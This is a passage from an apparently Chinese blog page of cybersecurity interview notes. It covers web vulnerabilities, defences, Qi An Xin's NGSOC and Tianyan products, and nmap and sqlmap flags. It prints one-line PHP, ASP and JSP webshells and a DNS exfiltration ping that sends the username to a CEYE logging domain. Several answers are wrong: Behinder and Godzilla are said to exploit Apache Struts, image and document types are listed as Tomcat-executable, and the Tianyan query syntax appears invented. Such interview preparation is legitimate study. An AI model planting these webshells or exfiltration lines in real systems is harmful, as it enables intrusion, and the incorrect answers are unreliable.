class=\"link\"   href=\"https://cloud.tencent.com/product/waf?from=20065&from_column=20065\" >web应用防火墙<i class=\"fas fa-external-link-alt\"></i></a>，可以防止网站挂马保障网页安全，部署在WEB服务器区域；</li>\n<li>数据库审计设备是把对数据库所有的操作记录下来，方便后期溯源审计和责任明确，部署在运维管理区域或者数据库审计区域均可。</li>\n<li>漏扫即<a class=\"link\"   href=\"https://cloud.tencent.com/product/vds?from=20065&from_column=20065\" >漏洞扫描<i class=\"fas fa-external-link-alt\"></i></a>就是给系统做体检，可以扫描出操作系统漏洞、数据库漏洞、WEB漏洞，方便管理员对暴露出的漏洞情况进行安全加固。一般部署在安全检测区域。</li>\n<li>网页防篡改一般和WAF配合使用，保护web网页不被黑客篡改，如果被篡改了，那结果仍然可以显示篡改前的正常页面，在政府行业用的最多。一般是软件直接安装在WEB服务器上。</li>\n<li>上网行为管理设备说白了是可以记录员工的上网行为，包括浏览网页的地址、检索内容、聊天记录等，一般旁挂于核心交换机。</li>\n<li>堡垒机即运维审计设备，所有涉及到登录设备（如服务器、存储、交换机、防火墙等ICT产品）的操作都要先登录到堡垒机统一登录入口。同时所有的操作都会被审计下来，方便后期溯源取证。</li>\n</ul>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"pdf解析有没有可能存在xxe\"><a href=\"#pdf解析有没有可能存在xxe\" class=\"headerlink\" title=\"pdf解析有没有可能存在xxe\"></a>pdf解析有没有可能存在xxe</h3><p>是的，PDF 解析器可能存在 XXE（XML 外部实体注入）漏洞。这是因为 PDF 格式支持内嵌 XML 数据，并且一些 PDF 解析器可能会对这些数据进行处理，其中可能包含 XML 实体。</p>\n<h3 id=\"http协议里面method和data\"><a href=\"#http协议里面method和data\" class=\"headerlink\" title=\"http协议里面method和data\"></a>http协议里面method和data</h3><p>方法\t描述\t是否包含主体<br>GET\t从服务器获取一份文档\t否<br>HEAD\t只从服务器获取文档的首部\t否<br>POST\t向服务器发送带要处理的数据\t是<br>PUT\t将请求的主体部分存储在服务器上\t是<br>TRACE\t对可能经过代理服务器传送到服务器上去的报文进行追踪\t否<br>OPTIONS\t决定可以在胀务器上执行哪些方法\t否<br>DELETE\t从服务器上删除一份文档\t否</p>\n<h3 id=\"威胁情报告警如何判断\"><a href=\"#威胁情报告警如何判断\" class=\"headerlink\" title=\"威胁情报告警如何判断\"></a>威胁情报告警如何判断</h3><h3 id=\"网络攻击类的告警要怎么判断\"><a href=\"#网络攻击类的告警要怎么判断\" class=\"headerlink\" title=\"网络攻击类的告警要怎么判断\"></a>网络攻击类的告警要怎么判断</h3><h3 id=\"sql注入的修复方式\"><a href=\"#sql注入的修复方式\" class=\"headerlink\" title=\"sql注入的修复方式\"></a>sql注入的修复方式</h3><ul>\n<li>SQL语句预编译</li>\n<li>针对SQL输入内容进行限制、过滤 &#x2F;&#x2F;目前使用WAF对这一块进行处理</li>\n<li>针对提交的关键数据进行转义 ，比如\\select</li>\n<li>关闭错误信息输出 ，因为有些错误返回信息，会返回物理路径、数据库版本信息等</li>\n<li>数据库权限严格控制 ，不同级别的用户，只能进行相应级别权限的操作</li>\n<li>敏感信息严格加密处理</li>\n</ul>\n<h3 id=\"网络攻击的方向来自哪三个方向\"><a href=\"#网络攻击的方向来自哪三个方向\" class=\"headerlink\" title=\"网络攻击的方向来自哪三个方向\"></a>网络攻击的方向来自哪三个方向</h3><h3 id=\"如何判断攻击是不是误报\"><a href=\"#如何判断攻击是不是误报\" class=\"headerlink\" title=\"如何判断攻击是不是误报\"></a>如何判断攻击是不是误报</h3><h3 id=\"DNS外带存在哪些漏洞\"><a href=\"#DNS外带存在哪些漏洞\" class=\"headerlink\" title=\"DNS外带存在哪些漏洞\"></a>DNS外带存在哪些漏洞</h3><ul>\n<li><p>sql盲注</p>\n</li>\n<li><p>XSS</p>\n</li>\n<li><p>命令执行</p>\n</li>\n<li><p>windows可以查询主机用户名等</p>\n<p>ping %USERNAME%.XXX.CEYE.IO</p>\n</li>\n<li><p>xxe</p>\n</li>\n<li><p>ssrf</p>\n</li>\n</ul>\n<h3 id=\"什么是攻防演练\"><a href=\"#什么是攻防演练\" class=\"headerlink\" title=\"什么是攻防演练\"></a>什么是攻防演练</h3><p>网络安全实战攻防演练是以获取指定目标系统（标靶系统）的管理权限为目标的攻防演练，由攻防领域经验丰富的红队专家组成攻击队，在保障业务系统稳定运行的前提下，采用“不限攻击路径，不限制攻击手段”的贴合实战方式，而形成的“有组织”的网络攻击行动。攻防演练通常是在真实网络环境下对参演单位目标系统进行全程可控、可审计的实战攻击，拟通过演练检验参演单位的安全防护和应急处置能力，提高网络安全的综合防控能力。</p>\n<h3 id=\"怎么判断socket代理\"><a href=\"#怎么判断socket代理\" class=\"headerlink\" title=\"怎么判断socket代理\"></a>怎么判断socket代理</h3><blockquote>\n<p>通过 Websocket 的 bufferedAmount 来探测用户是否采用来代理</p>\n<ol>\n<li>Client 通过 Websocket 与 Server 建立连接</li>\n<li>Server 监听到 connect 事件后，将本次 TCP 的 window size 设置为 0，这也就意味着 Client 无法继续将数据包传给 server</li>\n<li>Client 使用 websocket.send()持续发送几个包</li>\n<li>在 Client 上观察 websocket.bufferedAmount 值，如果过了一会，这个值一直在增大，说明无代理，否则存在代理<br>为啥可以通过这个值来判断呢？这是因为代理工具一般不会转发 TCP 的设置，也就是说，开启了代理的 Client 发出的包会被代理给吃掉</li>\n</ol>\n</blockquote>\n<h3 id=\"一句话木马\"><a href=\"#一句话木马\" class=\"headerlink\" title=\"一句话木马\"></a>一句话木马</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php @eval($_POST[1]);?&gt;    php</span><br><span class=\"line\">&lt;%eval request(&quot;chopper&quot;)%&gt;   asp</span><br><span class=\"line\"> &lt;%Process process = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%&gt;  jsp</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"社工手段有哪些\"><a href=\"#社工手段有哪些\" class=\"headerlink\" title=\"社工手段有哪些\"></a>社工手段有哪些</h3><ul>\n<li>邮件钓鱼 </li>\n<li>伪装成熟人</li>\n</ul>\n<h3 id=\"fastjson\"><a href=\"#fastjson\" class=\"headerlink\" title=\"fastjson\"></a>fastjson</h3><h3 id=\"客服有映射到外网的服务器被打进来了，如何溯源\"><a href=\"#客服有映射到外网的服务器被打进来了，如何溯源\" class=\"headerlink\" title=\"客服有映射到外网的服务器被打进来了，如何溯源\"></a>客服有映射到外网的服务器被打进来了，如何溯源</h3><h3 id=\"常见的中间件漏洞\"><a href=\"#常见的中间件漏洞\" class=\"headerlink\" title=\"常见的中间件漏洞\"></a>常见的中间件漏洞</h3><p>IIS</p>\n<ul>\n<li>解析漏洞</li>\n<li>put任意文件写入</li>\n<li>段文件漏洞</li>\n</ul>\n<p>apache</p>\n<ul>\n<li>未知扩展名解析漏洞</li>\n<li>addhandler导致的解析漏洞</li>\n<li>换行解析漏洞</li>\n</ul>\n<p>nginx</p>\n<ul>\n<li>解析漏洞</li>\n<li>空字节任意代码执行</li>\n<li>文件名逻辑漏洞‘</li>\n<li>配置错误导致的安全问题</li>\n</ul>\n<p>tomcat</p>\n<ul>\n<li>任意文件写入</li>\n<li>远程代码执行</li>\n<li>弱口令+后台getshell</li>\n</ul>\n<p>jboss</p>\n<ul>\n<li>反序列化漏洞</li>\n<li>弱口令</li>\n</ul>\n<h3 id=\"ngsoc冷热数据\"><a href=\"#ngsoc冷热数据\" class=\"headerlink\" title=\"ngsoc冷热数据\"></a>ngsoc冷热数据</h3><p>奇安信网神态势感知与安全运营平台（简称NGSOC）</p>\n<h3 id=\"代理工具类告警，流量特征\"><a href=\"#代理工具类告警，流量特征\" class=\"headerlink\" title=\"代理工具类告警，流量特征\"></a>代理工具类告警，流量特征</h3><h3 id=\"你感觉windows漏洞多还是linux漏洞多\"><a href=\"#你感觉windows漏洞多还是linux漏洞多\" class=\"headerlink\" title=\"你感觉windows漏洞多还是linux漏洞多\"></a>你感觉windows漏洞多还是linux漏洞多</h3><p>个人觉得linux漏洞多，debian linux漏洞最多</p>\n<h3 id=\"永恒之蓝\"><a href=\"#永恒之蓝\" class=\"headerlink\" title=\"永恒之蓝\"></a>永恒之蓝</h3><p>2017年</p>\n<p>用Windows系统的SMB协议漏洞来获取系统的最高权限 139，445端口</p>\n<h3 id=\"sql注入写文件\"><a href=\"#sql注入写文件\" class=\"headerlink\" title=\"sql注入写文件\"></a>sql注入写文件</h3><p>load_file()读文件 into outfile &#x2F; into dumpfile写文件</p>\n<h3 id=\"正向代理反向代理\"><a href=\"#正向代理反向代理\" class=\"headerlink\" title=\"正向代理反向代理\"></a>正向代理反向代理</h3><p>正向代理代理的对象是客户端，反向代理代理的对象是服务端。</p>\n<h3 id=\"延时注入在流量告警上如何判断的\"><a href=\"#延时注入在流量告警上如何判断的\" class=\"headerlink\" title=\"延时注入在流量告警上如何判断的\"></a>延时注入在流量告警上如何判断的</h3><h3 id=\"宽字节\"><a href=\"#宽字节\" class=\"headerlink\" title=\"宽字节\"></a>宽字节</h3><p>一个字符数大小为两个字节的为宽字节，比如GBK编码，我们汉字通常使用的就是GBK编码，也就是说一次性会读取两个字节。</p>\n<p>当我们的mysql使用GBK编码后，同时两个字符的前一个字符ASCII码大于128时，会将两个字符认成一个汉字</p>\n<h3 id=\"流量代理工具有哪些\"><a href=\"#流量代理工具有哪些\" class=\"headerlink\" title=\"流量代理工具有哪些\"></a>流量代理工具有哪些</h3><p>vpn，Shadowsocks，Trojan，WireGuard</p>\n<h3 id=\"冰蝎与哥斯拉的连接特征\"><a href=\"#冰蝎与哥斯拉的连接特征\" class=\"headerlink\" title=\"冰蝎与哥斯拉的连接特征\"></a>冰蝎与哥斯拉的连接特征</h3><p>冰蝎和哥斯拉都是利用远程管理工具（如Apache Struts漏洞）进行攻击，然后利用远程桌面协议（RDP）或SSH进行横向移动。</p>\n<p>都能够进行远程控制</p>\n<p>都可以进行数据窃取</p>\n<p>使用加密通信</p>\n<h3 id=\"怎么判断逻辑漏洞是否攻击成功\"><a href=\"#怎么判断逻辑漏洞是否攻击成功\" class=\"headerlink\" title=\"怎么判断逻辑漏洞是否攻击成功\"></a>怎么判断逻辑漏洞是否攻击成功</h3><ol>\n<li>行为变化：逻辑漏洞攻击成功后，攻击者可能会进行一些行为变化，比如访问一些不应该被访问的资源，或者执行一些不应该被执行的操作。</li>\n<li>数据变化：逻辑漏洞攻击成功后，攻击者可能会修改、删除或者新增某些数据。</li>\n<li>系统响应：逻辑漏洞攻击成功后，系统可能会出现异常响应，比如返回异常的HTTP状态码或者错误信息。</li>\n<li>安全日志：逻辑漏洞攻击成功后，可能会在系统的安全日志中留下痕迹，比如异常访问记录、错误日志等。</li>\n</ol>\n<h3 id=\"sql注入修复方式\"><a href=\"#sql注入修复方式\" class=\"headerlink\" title=\"sql注入修复方式\"></a>sql注入修复方式</h3><ul>\n<li>SQL语句预编译</li>\n<li>针对SQL输入内容进行限制、过滤 &#x2F;&#x2F;目前使用WAF对这一块进行处理</li>\n<li>针对提交的关键数据进行转义 ，比如\\select</li>\n<li>关闭错误信息输出 ，因为有些错误返回信息，会返回物理路径、数据库版本信息等</li>\n<li>数据库权限严格控制 ，不同级别的用户，只能进行相应级别权限的操作</li>\n<li>敏感信息严格加密处理</li>\n</ul>\n<h3 id=\"天眼与ngsoc区别\"><a href=\"#天眼与ngsoc区别\" class=\"headerlink\" title=\"天眼与ngsoc区别\"></a>天眼与ngsoc区别</h3><p>NGSOC主要应用于较为复杂、高风险的网络环境，如金融机构、能源公司等，其主要优点是可以集成多种不同的安全监测工具，实现信息的智能化分析和响应；而天眼则更加注重对企业内部网络资产的保护，具备网络漏洞检测和入侵攻击检测等多种功能。</p>\n<h3 id=\"文件上传漏洞如何防御\"><a href=\"#文件上传漏洞如何防御\" class=\"headerlink\" title=\"文件上传漏洞如何防御\"></a>文件上传漏洞如何防御</h3><ul>\n<li><p>检查文件上传路径 ( 避免 0x00 截断、 IIS6.0 文件夹解析漏洞、目录遍历 )</p>\n</li>\n<li><p>文件扩展名检测 ( 避免服务器以非图片的文件格式解析文件 ),验证文件扩展名 通常有两种方式 : 黑名单和白名单 .</p>\n</li>\n<li><p>文件 MIME验证 ( 比如 GIF 图片 MIME为 image&#x2F;gif,CSS 文件的 MIME为 text&#x2F;css 等 ) 3. 文件内容检测 ( 避免图片中插入 webshell)</p>\n</li>\n<li><p>图片二次渲染 ( 最变态的上传漏洞防御方式 , 基本上完全避免了文件上传漏洞 )</p>\n</li>\n<li><p>文件重命名 ( 如随机字符串或时间戳等方式 , 防止攻击者得到 webshell 的路径 )</p>\n</li>\n<li><p>隐藏上传路径</p>\n</li>\n</ul>\n<h3 id=\"xff\"><a href=\"#xff\" class=\"headerlink\" title=\"xff\"></a>xff</h3><p>x-forwarded-for 表了HTTP的请求端真实的IP</p>\n<p>可以进行sql注入</p>\n<h3 id=\"sql注入写文件前提\"><a href=\"#sql注入写文件前提\" class=\"headerlink\" title=\"sql注入写文件前提\"></a>sql注入写文件前提</h3><ul>\n<li>对web目录具有读写权限</li>\n<li>知道文件绝对路径</li>\n<li>能够使用联合查询（sql注入时）</li>\n<li>secure_file_priv，File_priv</li>\n</ul>\n<h3 id=\"sqlmap一些参数\"><a href=\"#sqlmap一些参数\" class=\"headerlink\" title=\"sqlmap一些参数\"></a>sqlmap一些参数</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-h                  输出参数说明</span><br><span class=\"line\">-hh                 输出详细的参数说明</span><br><span class=\"line\">-v                  输出级别（0~6，默认1）</span><br><span class=\"line\">-u url              指定url</span><br><span class=\"line\">--data=DATA         该参数指定的数据会被作为POST数据提交</span><br><span class=\"line\">-r file.txt         常用于POST注入或表单提交时注入</span><br><span class=\"line\">-p / --skip         指定/跳过测试参数</span><br><span class=\"line\">--cookie            设置cookie</span><br><span class=\"line\">--force-ssl         强制使用SSL</span><br><span class=\"line\">--threads           指定线程并发数</span><br><span class=\"line\">--prefix            指定前缀</span><br><span class=\"line\">--suffix            指定后缀</span><br><span class=\"line\">--level             检测级别（1~5，默认1）</span><br><span class=\"line\">--risk              风险等级（1~4，默认1）</span><br><span class=\"line\">--all               列举所有可访问的数据（不推荐）</span><br><span class=\"line\">--banner            列举数据库系统的信息等</span><br><span class=\"line\">--current-user      输出当前用户</span><br><span class=\"line\">--current-db        输出当前所在数据库</span><br><span class=\"line\">--hostname          输出服务器主机名</span><br><span class=\"line\">--is-dba            检测当前用户是否为管理员</span><br><span class=\"line\">--users             输出数据库系统的所有用户</span><br><span class=\"line\">--dbs               输出数据库系统的所有数据库</span><br><span class=\"line\">-D DB               指定数据库</span><br><span class=\"line\">--tables            在-D情况下输出库中所有表名</span><br><span class=\"line\">-T table            在-D情况下指定数据表</span><br><span class=\"line\">--columns           在-D -T情况下输出表中所有列名</span><br><span class=\"line\">-C column           在-D -T情况下输出某列数据的值</span><br><span class=\"line\">--dump              拉取数据存放到本地</span><br><span class=\"line\">--dump-all          拉取所有可访问数据存放到本地</span><br><span class=\"line\">--count             输出数据条目数量</span><br><span class=\"line\">--search            搜索数据库名、表明、列名，需要与-D -T或-C 联用</span><br><span class=\"line\">--sql-query         执行任意的SQL语句</span><br><span class=\"line\">--sql-shell         使用交互式SQL语句执行环境</span><br><span class=\"line\">--flie-read         读取文件</span><br><span class=\"line\">--file-write        上传文件（指定本地路径）</span><br><span class=\"line\">--file-dest         上传文件（指定目标机器路径）</span><br><span class=\"line\">--os-cmd            执行任意系统命令</span><br><span class=\"line\">--os-shell          使用交互式shell执行命令</span><br><span class=\"line\">--batch             所有要求输入都选取默认值</span><br><span class=\"line\">--wizard            初学者向导</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"csrf\"><a href=\"#csrf\" class=\"headerlink\" title=\"csrf\"></a>csrf</h3><p>攻击者可以盗用你的登陆信息，以你的身份模拟发送各种请求对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作</p>\n<p>CSRF 攻击的三个条件 :</p>\n<pre><code>   1 . 用户已经登录了站点 A，并在本地记录了 cookie\n\n   2 . 在用户没有登出站点 A 的情况下（也就是 cookie 生效的情况下），访问了恶意攻击者提供的引诱危险站点 B (B 站点要求访问站点A)。\n\n   3 . 站点 A 没有做任何 CSRF 防御\n</code></pre>\n<p><strong>漏洞检测</strong></p>\n<p>检测CSRF漏洞最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p>\n<p><strong>防御</strong></p>\n<ol>\n<li>验证 HTTP Referer 字段；</li>\n<li>在请求地址中添加 token 并验证；</li>\n<li>在 HTTP 头中自定义属性并验证；</li>\n<li>Chrome 浏览器端启用 SameSite cookie</li>\n</ol>\n<h3 id=\"ssrf\"><a href=\"#ssrf\" class=\"headerlink\" title=\"ssrf\"></a>ssrf</h3><p>服务端请求伪造(Server-Side Request Forgery),指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。</p>\n<p>防御</p>\n<p>1、过滤返回的信息，如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>\n<p>2、统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态。</p>\n<p>3、限制请求的端口，比如80,443,8080,8090。</p>\n<p>4、禁止不常用的协议，仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F;等引起的问题。</p>\n<p>5、使用DNS缓存或者Host白名单的方式。</p>\n<h3 id=\"水坑漏洞\"><a href=\"#水坑漏洞\" class=\"headerlink\" title=\"水坑漏洞\"></a>水坑漏洞</h3><p>水坑攻击（Watering Hole Attack）”是一种网络攻击方式。攻击者通过在特定网页中植入恶意代码，来攻击访问该网页的用户</p>\n<p>防御</p>\n<p>（1）    及时更新操作系统及应用程序，修复已知漏洞；</p>\n<p>（2）    安装可以信赖的安全软件，及时发现网页浏览过程中的异常行为；</p>\n<p>（3）    监测所有网络传输流量，及时发现异常通信；</p>\n<h3 id=\"鱼叉攻击\"><a href=\"#鱼叉攻击\" class=\"headerlink\" title=\"鱼叉攻击\"></a>鱼叉攻击</h3><p>鱼叉攻击，肯定是有看到了鱼再叉，也就是有针对性的攻击，目标明确，比如公司或团体，给这些特定团体发送包含木马的邮件，这种邮件要让受害者打开，就需要一个欺骗和迷惑的标题。这个题目和内容的构造就考验红方的想象力了。比如打补丁的通知邮件，放假通知安排，投诉举报，简历投递或者来点公司的劲爆信息引爆吃瓜群众。员工点了附件之后，就中了木马，黑客在远端就可以远程控制这个电脑了。</p>\n<h3 id=\"tomcat可以执行的后缀名\"><a href=\"#tomcat可以执行的后缀名\" class=\"headerlink\" title=\"tomcat可以执行的后缀名\"></a>tomcat可以执行的后缀名</h3><p>jsp html htm js css xml gif jpg png pdf doc xls</p>\n<h3 id=\"ssrf有哪些协议\"><a href=\"#ssrf有哪些协议\" class=\"headerlink\" title=\"ssrf有哪些协议\"></a>ssrf有哪些协议</h3><p>http https ftp smtp dns file </p>\n<h3 id=\"mysql数据库系统执行函数\"><a href=\"#mysql数据库系统执行函数\" class=\"headerlink\" title=\"mysql数据库系统执行函数\"></a>mysql数据库系统执行函数</h3><h3 id=\"nmap参数\"><a href=\"#nmap参数\" class=\"headerlink\" title=\"nmap参数\"></a>nmap参数</h3><ul>\n<li>-sS 半开扫描(TCP SYN扫描)，执行速度快，不容易被注意到，可以避免被记入目标系统的日志，需要root权限。它常常被称为半开放扫描， 因为它不打开一个完全的TCP连接。它发送一个SYN报文， 就像您真的要打开一个连接，然后等待响应。</li>\n<li>-sT 当SYN扫描不能用时，TCP Connect()扫描就是默认的TCP扫描。会在⽬标主机的⽇志中记录⼤批连接请求和错误信息，但是由于是tcp connect()扫描，容易被记录。当SYN扫描可用时，它通常是更好的选择</li>\n<li>-sP ping扫描，Nmap在扫描端⼜时，默认都会使⽤ping扫描，只有主机存活，Nmap才会继续扫描。</li>\n<li>-sU UDP扫描，但UDP扫描是不可靠的，速度也比较慢</li>\n<li>-sA 这种扫描与目前为止讨论的其它扫描的不同之处在于 它不能确定open(开放的)或者 open|filtered(开放或者过滤的))端口。 它用于发现防火墙规则，确定它们是有状态的还是无状态的，哪些端口是被过滤的。</li>\n<li>-sV 探测端⼜服务版本</li>\n<li>-Pn 扫描之前不需要⽤ping命令，有些防⽕墙禁⽌ping命令。可以使⽤此选项进⾏扫描</li>\n<li>-v 显⽰扫描过程，推荐使⽤</li>\n<li>-p 指定端⼜，如“1-65535、1433、135、22、80”等</li>\n<li>-O 启⽤远程操作系统检测，存在误报</li>\n<li>-O –osscan-limit 针对指定的目标进行操作系统检测</li>\n<li>-O –osscan-guess 当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认 进行这种匹配</li>\n<li>-A 全⾯系统检测、启⽤脚本检测、扫描等</li>\n<li>-oN&#x2F;-oX&#x2F;-oG 将报告写⼊⽂件，分别是正常、XML、grepable 三种格式</li>\n<li>-iL 读取主机列表，例如，-iL “C:\\ip.txt”</li>\n</ul>\n<h3 id=\"天眼可以检测逻辑漏洞吗\"><a href=\"#天眼可以检测逻辑漏洞吗\" class=\"headerlink\" title=\"天眼可以检测逻辑漏洞吗\"></a>天眼可以检测逻辑漏洞吗</h3><p>天眼的漏洞扫描模块主要基于静态代码分析和黑盒测试技术，对于逻辑漏洞的检测能力相对有限。</p>\n<h3 id=\"内网渗透工具，代理\"><a href=\"#内网渗透工具，代理\" class=\"headerlink\" title=\"内网渗透工具，代理\"></a>内网渗透工具，代理</h3><h3 id=\"渗透测试流程\"><a href=\"#渗透测试流程\" class=\"headerlink\" title=\"渗透测试流程\"></a>渗透测试流程</h3><ul>\n<li>确定目标和范围：定义渗透测试的目标和范围，包括要测试的系统、应用程序、网络、物理设施等。</li>\n<li>收集情报：收集有关目标系统的信息，例如 IP 地址、操作系统类型、应用程序版本、网络拓扑等，以便进行后续测试。</li>\n<li>漏洞扫描：使用漏洞扫描工具对目标系统进行扫描，以发现已知的漏洞和弱点。</li>\n<li>渗透测试：通过手动测试和自动化工具进行渗透测试，包括尝试各种攻击向量，如 SQL 注入、XSS 攻击、文件包含漏洞、社交工程等。</li>\n<li>提交漏洞报告：将发现的漏洞和安全弱点整理成报告，详细描述漏洞的影响和风险，并提供建议和修复措施。</li>\n<li>清理痕迹：在测试完成后，清除所有测试过程中留下的痕迹，确保不会对目标系统造成任何影响或损害。</li>\n<li>重复测试：在修复漏洞后，进行重复测试以确认漏洞已被修复，并且没有引入新的漏洞。</li>\n</ul>\n<h3 id=\"天眼日志分析语法\"><a href=\"#天眼日志分析语法\" class=\"headerlink\" title=\"天眼日志分析语法\"></a>天眼日志分析语法</h3><p>天眼日志分析语法（TianEye Log Query Syntax）是指在奇安信的天眼平台上，用于查询、分析和可视化各种日志数据的语法。以下是一些常见的天眼日志分析语法示例：</p>\n<ol>\n<li>关键字查询：使用关键字查询指定时间段内的日志数据。例如，查询访问时间为2022年4月1日至4月30日之间的所有日志：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index=xxx sourcetype=yyy access_time&gt;=2022-04-01 access_time&lt;=2022-04-30</span><br></pre></td></tr></table></figure>\n\n<p>精确匹配查询：使用精确匹配查询指定某个字段的值。例如，查询客户端 IP 地址为 192.168.1.100 的所有日志：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index=xxx sourcetype=yyy client_ip=192.168.1.100</span><br></pre></td></tr></table></figure>\n\n<p>多条件查询：使用多个条件查询组合查询结果。例如，查询客户端 IP 地址为 192.168.1.100，且访问时间为2022年4月1日至4月30日之间的所有日志：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index=xxx sourcetype=yyy client_ip=192.168.1.100 access_time&gt;=2022-04-01 access_time&lt;=2022-04-30</span><br></pre></td></tr></table></figure>\n\n<p>聚合查询：使用聚合函数统计查询结果。例如，查询某个时间段内 HTTP 访问次数最多的前 10 个客户端 IP 地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index=xxx sourcetype=yyy access_time&gt;=2022-04-01 access_time&lt;=2022-04-30 | top 10 client_ip</span><br></pre></td></tr></table></figure>\n\n<p>可视化查询：使用可视化组件将查询结果可视化。例如，使用柱状图可视化某个时间段内 HTTP 访问次数最多的前 10 个客户端 IP 地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index=xxx sourcetype=yyy access_time&gt;=2022-04-01 access_time&lt;=2022-04-30 | </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"天眼流量分析和威胁检测区别\"><a href=\"#天眼流量分析和威胁检测区别\" class=\"headerlink\" title=\"天眼流量分析和威胁检测区别\"></a>天眼流量分析和威胁检测区别</h3><p>天眼流量分析和威胁检测是奇安信的天眼平台提供的两个不同的功能模块，它们的主要区别如下：</p>\n<ol>\n<li>功能目标不同：天眼流量分析的主要目标是分析网络流量，了解网络拓扑结构、通信情况和性能状况，发现网络异常和瓶颈问题等；而威胁检测的主要目标是检测和预防网络威胁和攻击，包括漏洞扫描、入侵检测、恶意代码检测、网络流量分析等多个方面。</li>\n<li>数据来源不同：天眼流量分析主要关注网络流量数据，可以采集和分析网络设备、流量数据、协议、应用等方面的数据；而威胁检测则需要多种数据源的支持，如安全事件日志、主机安全数据、网络安全数据、终端安全数据等。</li>\n<li>数据处理方式不同：天眼流量分析主要采用流量抓包、协议解析、拓扑分析等技术进行数据处理和分析；而威胁检测则采用多种技术手段进行数据处理和分析，如恶意代码识别、行为分析、异常检测、漏洞扫描等。</li>\n<li>应用场景不同：天眼流量分析主要适用于网络运维、网络性能分析、网络安全监控等领域；而威胁检测则适用于网络安全、信息安全等领域，可以帮助企业发现和防范各种网络威胁和攻击。</li>\n</ol>\n<h3 id=\"天眼可以审0day吗\"><a href=\"#天眼可以审0day吗\" class=\"headerlink\" title=\"天眼可以审0day吗\"></a>天眼可以审0day吗</h3><p>不可以</p>\n<h3 id=\"怎么判断自己的机器是不是域控\"><a href=\"#怎么判断自己的机器是不是域控\" class=\"headerlink\" title=\"怎么判断自己的机器是不是域控\"></a>怎么判断自己的机器是不是域控</h3><ol>\n<li>打开计算机管理器：在 Windows 操作系统中，可以通过在开始菜单中搜索“计算机管理器”来打开计算机管理器。</li>\n<li>查看域：在计算机管理器中，展开“本地用户和组”或“计算机管理”等选项卡，然后选择“域”。如果机器加入了域并成为域控制器，将会在此处看到域的名称和其他域控制器的信息。</li>\n<li>检查服务：在 Windows 操作系统中，域控制器会运行一些特定的服务，比如“Active Directory域服务”，“DNS服务器服务”等。可以通过打开“服务”选项卡来查看这些服务是否在运行，并且是否是自动启动。</li>\n<li>检查系统信息：在 Windows 操作系统中，可以通过打开“系统信息”来查看机器的详细信息。在其中的“系统摘要”选项卡中，如果机器是域控制器，将会看到“角色”一栏显示“域控制器”。</li>\n</ol>\n<h3 id=\"常见webshell流量体征\"><a href=\"#常见webshell流量体征\" class=\"headerlink\" 